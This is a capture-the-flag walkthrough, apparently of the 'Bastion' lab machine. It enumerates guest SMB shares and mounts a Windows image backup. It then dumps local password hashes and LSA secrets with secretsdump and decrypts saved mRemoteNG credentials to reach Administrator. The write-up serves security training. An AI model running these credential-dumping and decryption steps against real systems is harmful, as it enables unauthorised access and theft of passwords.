1,Recon
port scan
```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-17T02:24:02
|_  start_date: 2024-12-17T02:20:32
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-17T03:24:06+01:00
|_clock-skew: mean: -19m59s, deviation: 34m35s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
From the port scan, we can confirm this is a AD environment.
So let's enumerate all the smb services.
```
smbclient -L //10.10.10.134              
Password for [WORKGROUP\wither]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can login to Backups with guest here.
```
smbclient //10.10.10.134/Backups
Password for [WORKGROUP\wither]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2746988 blocks available

```

the note gives us 
```
note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

A Windows Image Backup is likely to be large and the transfer will be slow (as the note warns). Rather than try to copy it over, I’m going to mount this share to my filesystem.
```
root@kali# mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
root@kali# ls /mnt/
note.txt  SDT65CB.tmp  WindowsImageBackup
```
I’ll list all the files in the share:
```
find /mnt/ -type f
/mnt/note.txt
/mnt/SDT65CB.tmp
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/BackupSpecs.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/BackupGlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/GlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/MediaId
/mnt/WindowsImageBackup/L4mpje-PC/SPPMetadataCache/{cd113385-65ff-4ea2-8ced-5630f6feca8f}
```

I see two disk image vhd files here.
```
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```
I’m going to mount the virtual disk files and see what I can find in them. First, I’ll install `guestmount` with `apt install libguestfs-tools`, a tool for mounting virtual hard disk files on Linux.

Now, I’ll try to mount each of the two VHD files. The first one fails
```
guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
guestmount: no operating system was found on this disk

If using guestfish ‘-i’ option, remove this option and instead
use the commands ‘run’ followed by ‘list-filesystems’.
You can then mount filesystems you want by hand using the
‘mount’ or ‘mount-ro’ command.

If using guestmount ‘-i’, remove this option and choose the
filesystem(s) you want to see by manually adding ‘-m’ option(s).
Use ‘virt-filesystems’ to see what filesystems are available.

If using other virt tools, this disk image won’t work
with these tools.  Use the guestfish equivalent commands
(see the virt tool manual page).

```

But the second one is worked
```
root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/

root@kali# ls /mnt2/
'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
```

With full access to the file system, I have access to the registry files. These files can be locked when the system is running, but I won’t have that issue on a mounted drive. In the config directory where the registry hives are stored, I’ll use `secretsdump.py` to dump the password hashes:
```
/opt/utilities/impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```

Then we can get the cracked password
![](images/Pasted%20image%2020241217024521.png)

Seeing ssh on a Windows box is a bit unusual, but this seems like a good chance to use it. I can ssh in as l4mpje:
```
ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>
```

In looking at the installed programs on the host, mRemoteNG jumps out as interesting:
```
PS C:\Program Files (x86)> dir


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        16-7-2016     15:23                Common Files
d-----        23-2-2019     09:38                Internet Explorer
d-----        16-7-2016     15:23                Microsoft.NET
da----        22-2-2019     14:01                mRemoteNG
d-----        23-2-2019     10:22                Windows Defender
d-----        23-2-2019     09:38                Windows Mail
d-----        23-2-2019     10:22                Windows Media Player
d-----        16-7-2016     15:23                Windows Multimedia Platform
d-----        16-7-2016     15:23                Windows NT
d-----        23-2-2019     10:22                Windows Photo Viewer
d-----        16-7-2016     15:23                Windows Portable Devices
d-----        16-7-2016     15:23                WindowsPowerShell

```

mRemoteNG is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user’s AppData directory, confCons.xml, that holds that information:
```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         

22-02-2019  15:03    <DIR>          .                                                                                           
22-02-2019  15:03    <DIR>          ..                                                                                          
22-02-2019  15:03             6.316 confCons.xml                                                                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
22-02-2019  15:03                51 extApps.xml                                                                                 
22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
22-02-2019  15:03             2.245 pnlLayout.xml                                                                               
22-02-2019  15:01    <DIR>          Themes                                                                                      
              14 File(s)         76.577 bytes                                                                                   
               3 Dir(s)  11.383.193.600 bytes free  

```

It’s xml, with encrypted versions of the passwords stored in the file:
```
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="9+/QC0ASX6vyu8eqAnoWf9rAqVvP8vuwonKagk7aY68lTF3pcqbgO0Lcj6E7xUwo6V47gl93CKdDTXKpYt0wOFk6" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

There is a mremoteng-decrypt showed up on GitHub
`https://github.com/kmahyyg/mremoteng-decrypt.git`

Then we can successfully get the cracked password
```
python3 mremoteng_decrypt.py -s V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
Password: thXLHM96BeKL0ER2
```
Then just use ssh to connect it and get the SYSTEM shell.
